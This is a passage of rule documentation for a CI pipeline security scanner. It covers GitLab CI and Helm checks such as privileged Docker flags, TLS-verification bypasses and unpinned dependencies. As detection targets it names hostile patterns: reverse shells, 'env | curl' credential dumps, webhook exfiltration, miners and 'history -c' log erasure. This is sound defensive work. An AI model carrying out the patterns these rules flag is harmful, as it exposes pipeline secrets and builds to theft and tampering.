### `GL-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-017 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a pipeline give the container full access to the CI runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-017`](../providers/gitlab.md#gl-017) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-018 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-019`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-019 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`GL-019`](../providers/gitlab.md#gl-019) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-020`: CI_JOB_TOKEN written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-020 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Detects patterns where `CI_JOB_TOKEN` is redirected to a file, piped through `tee`, or appended to dotenv/artifact paths. Persisted tokens survive the job boundary and can be read by later stages, downloaded artifacts, or cache entries, turning a scoped credential into a long-lived one.

**Recommendation.** Never write CI_JOB_TOKEN to files, artifacts, or dotenv reports. Use the token inline in the command that needs it and let GitLab revoke it automatically when the job finishes.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-020`](../providers/gitlab.md#gl-020) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-021 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-021`](../providers/gitlab.md#gl-021) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-022 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR workflow (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`GL-022`](../providers/gitlab.md#gl-022) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-023 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** ``cosign sign`` and ``cosign attest`` look similar but mean different things: the first binds identity to bytes; the second binds a structured claim (builder, source, inputs) to the artifact. SLSA Build L3 verifiers check the latter.

**Recommendation.** Add a job that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or adopt a SLSA-aware builder (the SLSA project ships GitLab templates). Signing the artifact (GL-006) isn't enough for SLSA L3, the attestation describes *how* the build ran.

**Source:** [`GL-024`](../providers/gitlab.md#gl-024) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gl-025 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires on concrete indicators (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, ``webhook.site`` callbacks, ``env | curl`` credential dumps, ``history -c`` audit erasure). Orthogonal to GL-003 (curl pipe) and GL-017 (Docker insecure flags). Those flag risky defaults; this flags evidence.

**Recommendation.** Treat as a potential compromise. Identify the MR that added the matching job(s), rotate any credentials the pipeline can reach, and audit recent runs for outbound traffic to the matched hosts. A legitimate red-team exercise should be time-bounded via ``.pipelinecheckignore`` with ``expires:``.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-026 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** ``eval``, ``sh -c "$X"``, and `` `$X` `` all re-parse the variable's value as shell syntax. Once a CI variable feeds into one of these idioms, any ``;``, ``&&``, ``|``, backtick, or ``$()`` in the value executes, even if the variable's source is currently trusted, future refactors may expose it.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec of variables with direct command invocation. If the command must be dynamic, pass arguments as array members or validate the input against an allow-list at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`GL-026`](../providers/gitlab.md#gl-026) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-027 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Complements GL-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs all bypass the registry integrity controls the lockfile relies on, an attacker who can move a branch head, drop a sibling checkout, or change a served tarball can substitute code into the build.

**Recommendation.** Pin git dependencies to a commit SHA (``pip install git+https://…/repo@<sha>``, ``cargo install --git … --rev <sha>``). Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`GL-027`](../providers/gitlab.md#gl-027) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-028`: services: image not pinned <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-028 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** ``services:`` entries (top-level or per-job) can be either a string (``redis:7``) or a dict (``{name: redis:7, alias: cache}``). Both forms are normalized via ``image_ref``-style extraction and evaluated with the same floating-tag regex GL-001 uses for ``image:``.

**Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.

**Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-029`: Manual deploy job defaults to allow_failure: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-029 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** This is the most common GitLab deployment gotcha: a manual ``deploy`` job looks like a gate in the UI, but the pipeline reports success on the first run because the job is marked allow_failure by default. Downstream jobs (and the overall pipeline status) proceed as though the human approved.

**Recommendation.** Add ``allow_failure: false`` to every deploy-like ``when: manual`` job. GitLab defaults ``allow_failure`` to *true* for manual jobs, which makes the pipeline report success whether or not the operator clicks, exactly the opposite of the gate you meant to add.

**Source:** [`GL-029`](../providers/gitlab.md#gl-029) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-030`: trigger: include: pulls child pipeline without pinned ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-030 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** GL-005 only audits top-level ``include:``. Parent-child and multi-project pipelines that load YAML via the job-level ``trigger: include:`` slot slip through. Branch refs (``main``/``master``/``develop``/``head``) count as unpinned.

**Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.

**Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-031`: id_tokens: missing audience pin or environment binding <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-031 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** Pairs with IAM-008. IAM-008 verifies the cloud-side trust policy pins audience + subject; this rule verifies the GitLab-side workflow can't request a token without an audience claim or without a deployment gate.

**Recommendation.** For every job that declares an ``id_tokens:`` block, pin a non-wildcard ``aud:`` (a literal string the consumer trusts) AND bind the job to a protected ``environment:``. Audience pinning prevents token replay against unintended consumers; the environment binding gates which refs can drive the assume-role on the consumer side.

**Source:** [`GL-031`](../providers/gitlab.md#gl-031) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-032`: tags: interpolates untrusted CI variable <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-032 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GL-014 catches self-managed runners that aren't ephemeral; this rule catches the upstream targeting choice. When ``tags:`` is computed from an attacker-controllable CI variable, the operator (or anyone who can craft a PR title / branch name / commit message that the workflow consumes) picks where the job runs, including any privileged tag the instance exposes (``deploy-prod``, ``signer``, ``hsm`` …). The rule reuses the same untrusted-context catalog as GL-002 (``CI_COMMIT_MESSAGE``, ``CI_COMMIT_REF_NAME``, ``CI_MERGE_REQUEST_TITLE`` and friends) so the two rules stay in lockstep.

**Recommendation.** Hard-code ``tags:`` to a specific runner tag list. If runner selection has to be parameterised, validate the candidate value against an explicit allowlist in a job ``rules:`` block before the job runs, and never accept a ``$CI_COMMIT_*`` / ``$CI_MERGE_REQUEST_*`` field as a tag value directly.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Workflows that intentionally select runners by environment via a vetted ``variables:`` block (``RUNNER_TAG: deploy-prod``) referencing a build-time-set value are out of scope, the rule only matches the curated untrusted-predefined-variable catalog. Static custom variables (``$DEPLOY_FLEET`` defined inside the workflow file) are intentionally not flagged.

**Source:** [`GL-032`](../providers/gitlab.md#gl-032) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-033`: Global before_script / after_script propagates taint to every job <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-033 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GL-002 catches injection in **per-job** ``before_script:`` / ``script:`` / ``after_script:``, but its scanner walks ``iter_jobs`` which deliberately skips top-level keywords (``before_script``, ``after_script``, ``default``, ``image``, ``services``, ``variables``, ``stages``, ``workflow``, ``include``, ...). That means a tainted ``$CI_COMMIT_TITLE`` interpolation in a document-root ``before_script:`` or ``default.before_script:`` evades GL-002 entirely, even though it propagates to every job in the pipeline.

GL-033 closes that gap. It scans:

- ``before_script:`` at document root
- ``after_script:`` at document root
- ``default.before_script:`` (the modern form)
- ``default.after_script:``

for direct interpolation of the same attacker-controllable predefined variables tracked by GL-002 (``CI_COMMIT_TITLE`` / ``CI_COMMIT_MESSAGE`` / ``CI_COMMIT_REF_NAME`` / ``CI_MERGE_REQUEST_TITLE`` / ``CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`` / etc.). The detection mirrors GL-002's ``has_direct_taint`` helper so the quote-aware semantics are identical.

**Recommendation.** Move any setup logic that touches commit / MR metadata out of the document-root ``before_script:`` (and ``default.before_script:`` / ``default.after_script:``) and into a dedicated job that opts in via ``extends:`` or that runs on a known-safe trigger only. The global before-script runs verbatim before every job in the pipeline (including child pipelines launched by ``trigger:include:``); a single unquoted ``$CI_COMMIT_TITLE`` interpolation there is, in effect, that injection in N jobs at once. Quote the value defensively (``branch="$CI_COMMIT_REF_NAME"``) and copy it into a job-local variable before any further use.

**Known false positives.**

- Some self-hosted GitLab installations build a diagnostic banner into the global ``before_script`` that ``echo``s commit metadata for log-correlation purposes. Suppress per pipeline file rather than globally, the rule is checking propagation reach, not intent.

**Source:** [`GL-033`](../providers/gitlab.md#gl-033) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-034`: npm install without registry-signature verification step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-034 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires once per pipeline file when:

1. Some job's ``before_script:`` / ``script:`` / ``after_script:`` runs an npm or pnpm install verb (``npm ci``, ``npm install``, ``npm i``, ``pnpm install``, ``pnpm i``, ``pnpm ci``);
2. No job anywhere in the pipeline runs ``npm audit signatures`` or ``pnpm audit signatures``.

Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primitive is npm-CLI-specific (Yarn Berry's ``yarn npm audit`` does not yet verify registry trusted-publisher records). Pairs with the per-package lockfile rules NPM-002 / NPM-006: NPM-002 / NPM-006 verify *what* the lockfile pinned, GL-034 verifies the lockfile pinned what the maintainer actually signed.

**Recommendation.** Add an ``npm audit signatures`` step (or ``pnpm audit signatures``) after the install. Lockfile pinning only guarantees the bytes installed match what the lockfile recorded; ``audit signatures`` is what verifies those bytes were signed by the maintainer the registry recognizes as the package's trusted publisher. Run it as a separate script line after ``npm ci`` and before any code from ``node_modules/`` executes.

**Known false positives.**

- Pipelines that build against a private registry without trusted-publisher records (legacy Artifactory, self-hosted Verdaccio without sigstore) cannot run ``audit signatures`` meaningfully. Suppress on the specific pipeline with a rationale that names the private registry.

**Seen in the wild.**

- Shai-Hulud npm worm (2026) / TanStack / axios patch-release compromises rode the gap between lockfile-pinned integrity and registry-signed-publisher provenance. ``npm audit signatures`` is the gate that consumes trusted-publisher records.

**Source:** [`GL-034`](../providers/gitlab.md#gl-034) in the [GitLab CI provider](../providers/gitlab.md).

### `GL-035`: pip install without `--require-hashes` verification <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-035 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires once per pipeline file when:

1. Some job's ``before_script:`` / ``script:`` / ``after_script:`` runs a real ``pip install`` (``pip install``, ``pip3 install``, ``python -m pip install``) that isn't a tooling-bootstrap exempted by the allowlist;
2. No job uses ``--require-hashes`` AND no job uses a lockfile-consuming manager (``uv sync`` / ``uv pip sync``, ``poetry install``, ``pipenv install --deploy`` / ``pipenv sync``).

Tooling-bootstrap allowlist (same as GHA-060).

**Recommendation.** Pin every dependency with a SHA-256 hash and install with ``pip install -r requirements.txt --require-hashes``, or migrate to a manager that hash-pins by default: ``uv sync``, ``poetry install``, ``pipenv install --deploy``. Hash-pinned install is the PyPI equivalent of npm's lockfile-integrity guarantee: it refuses to install any tarball whose SHA-256 doesn't match a recorded entry.

**Known false positives.**

- Pipelines that build against a private index without SHA-256 hash records (legacy DevPI, self-hosted simple indexes without per-file hashes) cannot run ``--require-hashes`` meaningfully. Suppress on the specific pipeline with a rationale that names the private index.

**Seen in the wild.**

- PyPI maintainer-account compromises (ctx 2022, requests-darwin-lite 2024) shipped malicious sdists / wheels under existing version pins; ``--require-hashes`` would have refused the swap.

**Source:** [`GL-035`](../providers/gitlab.md#gl-035) in the [GitLab CI provider](../providers/gitlab.md).

### `HELM-001`: Chart.yaml declares legacy apiVersion: v1 <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-001 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** ``apiVersion`` lives at the top of ``Chart.yaml``. ``v1`` is Helm 2's format and uses a sibling ``requirements.yaml`` for dependencies; ``v2`` is Helm 3's format and inlines them in ``Chart.yaml`` alongside a ``Chart.lock`` for digest pinning. Without v2 there is no in-tree dependency manifest to lock, which is why HELM-002 only fires on v2 charts.

**Recommendation.** Bump ``Chart.yaml`` to ``apiVersion: v2`` and migrate any sibling ``requirements.yaml`` entries into the ``dependencies:`` list inside ``Chart.yaml``. Run ``helm dependency update`` to regenerate ``Chart.lock`` so HELM-002's per-dependency digest check has something to read. Helm 3 has been the default shipping channel since November 2019; the v1 format is kept for read-compat but blocks lockfile-based supply-chain controls.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-001`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-002`: Chart.lock missing per-dependency digests <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-002 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Three failure shapes:

1. ``Chart.yaml`` declares dependencies but no ``Chart.lock`` exists at all.
2. ``Chart.lock`` exists but its ``dependencies:`` list is missing entries declared in ``Chart.yaml`` (drift after an edit without re-running ``helm dependency update``).
3. ``Chart.lock`` lists every dependency but one or more entries lack a ``digest:`` field (lock generated by an old Helm 3 version that didn't always populate it).

v1 charts (HELM-001) are skipped. They predate ``Chart.lock`` and use ``requirements.lock`` against a sibling ``requirements.yaml``. Fix HELM-001 first.

**Recommendation.** After every change to ``dependencies:`` in ``Chart.yaml``, re-run ``helm dependency update`` and commit the regenerated ``Chart.lock``. The lock records the resolved version *and* a ``sha256:...`` digest that ``helm dependency build`` verifies on download, without it, a compromised chart repo can swap the tarball under the same version and ``helm install`` will happily use the substitute.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Charts with no dependencies (the ``dependencies:`` key is absent or empty) pass automatically. There is nothing to lock.

**Source:** [`HELM-002`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-003`: Chart dependency declared on a non-HTTPS repository <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-helm-003 }

**Evidences:** [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Walks ``Chart.yaml`` ``dependencies:`` (v2 charts only) and inspects each entry's ``repository:`` URL. Accepted schemes:

- ``https://``, chart-museum / OSS chart repos. The default for public Helm charts.
- ``oci://``, registry-hosted charts. TLS is enforced by the registry, not the URL scheme; we still accept this shape because Helm 3.8+ pulls OCI charts over HTTPS unless explicitly configured otherwise.
- ``file://``, in-repo dependency. No network surface.
- ``@alias``, local alias for a previously registered ``helm repo add`` URL. The scheme of the original URL is the user's responsibility (and is captured in the chart consumer's ``~/.config/helm/repositories.yaml``).

**Recommendation.** Switch each ``dependencies[].repository`` value to an ``https://`` chart repo URL, an ``oci://`` registry reference, or a ``file://`` path for in-repo charts. Plaintext ``http://`` (and other non-TLS schemes like ``git://``) lets any on-path attacker substitute the dependency tarball during ``helm dependency build``; ``Chart.lock``'s digest check (HELM-002) only catches that on the *next* update, not the compromised pull itself.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`HELM-003`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-004`: Chart dependency version is a range, not an exact pin <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-004 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** An exact pin is a string that contains only digits, dots, and at most a single leading ``v`` / trailing pre-release or build identifier (``1.2.3``, ``v1.2.3``, ``1.2.3-rc1``, ``1.2.3+build.5``). Anything carrying ``^`` / ``~`` / ``>`` / ``<`` / ``*`` / ``x`` / ``X`` / ``||`` / a space (``>=4 <5``) is treated as a range. The bias is toward false positives, a chart maintainer can suppress per-rule via ``--ignore-file`` if they specifically want range semantics, but the default for production charts is a pin.

**Recommendation.** Replace each ``dependencies[].version`` constraint with the exact resolved version from ``Chart.lock``. ``17.0.0`` instead of ``^17.0.0``, ``v1.2.3`` instead of ``~1.2``. Range syntax (``^``, ``~``, ``>=``, ``*``, ``x``) lets ``helm dependency update`` move every consumer of the chart to a newer dep on the next refresh, even when the lock file looked stable.

**Source:** [`HELM-004`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-005`: Chart maintainers field empty or missing chain-of-custody info <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-005 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** An ``maintainers:`` entry is considered usable when the value is a YAML mapping with ``name:`` set to a non-empty string and at least one of ``email:`` / ``url:`` populated. Entries that look like ``- name: TODO`` or carry blank contact fields fail the rule the same way a missing block does, the field exists but doesn't carry a real chain-of-custody signal.

**Recommendation.** Populate ``maintainers:`` in ``Chart.yaml`` with at least one entry carrying a ``name`` plus either an ``email`` or a ``url``. The ``name`` is the human a downstream consumer files an issue against; the contact field is the channel they reach. Charts published to ArtifactHub or an internal registry without this field are silently anonymous, fine for a personal scratch chart, not for one your CI pipeline will deploy to production.

**Known false positives.**

- Library charts (``Chart.yaml`` ``type: library``) often ship without maintainers when distributed inside a single team's monorepo where the org-level CODEOWNERS already names the contact. Suppress with ``--ignore-file`` when this matches your situation.

**Source:** [`HELM-005`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-006`: Chart.yaml does not declare a kubeVersion compatibility range <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-006 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** The field is a string carrying a Helm-flavoured SemVer range. Empty / missing fails the rule. Whitespace-only values fail too, an obviously-blank key should not satisfy a posture check.

**Recommendation.** Add a ``kubeVersion:`` SemVer range to ``Chart.yaml`` covering the Kubernetes versions you've actually rendered and tested the chart against. ``>= 1.25.0 < 1.32.0`` is the common shape for a chart maintained against the upstream support window. Helm will refuse ``helm install`` against a cluster whose ``kubectl version`` falls outside the range, catching silent-breakage surprises (removed apiVersions, renamed RBAC verbs, alpha features) at pre-flight rather than at runtime.

**Known false positives.**

- Library charts (``Chart.yaml`` ``type: library``) that wrap version-agnostic helpers often legitimately ship without ``kubeVersion``. Suppress with ``--ignore-file`` when the chart genuinely targets every supported Kubernetes minor.

**Source:** [`HELM-006`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-007`: Chart.yaml description field is empty or missing <span class="pg-sev pg-sev--low">LOW</span> { #detail-helm-007 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Walks ``Chart.yaml`` ``description:`` and fires when the field is missing, ``None``, or a string that's empty after stripping whitespace. The Helm chart spec doesn't enforce the field but every chart published to ArtifactHub or the upstream stable repo populates it; production charts that ship without it are usually a copy-paste-from-template oversight.

**Recommendation.** Set ``description:`` in ``Chart.yaml`` to a one-sentence summary of what the chart deploys (e.g. ``description: Postgres 14 cluster with WAL-G backups and a Prometheus exporter``). Helm registries display this string in chart listings; without it, anyone browsing has to read the README to figure out what the chart does.

**Source:** [`HELM-007`](../providers/helm.md) in the [Helm provider](../providers/helm.md).

### `HELM-008`: Chart.lock generated more than 90 days ago <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-helm-008 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

